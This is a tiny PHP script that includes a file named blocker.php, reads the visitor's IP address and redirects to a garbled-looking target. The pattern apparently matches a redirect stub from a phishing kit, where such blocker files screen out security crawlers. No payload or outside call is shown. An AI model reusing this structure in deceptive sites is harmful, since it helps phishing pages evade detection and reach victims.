<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

header("Location: _--==+-=__");
?>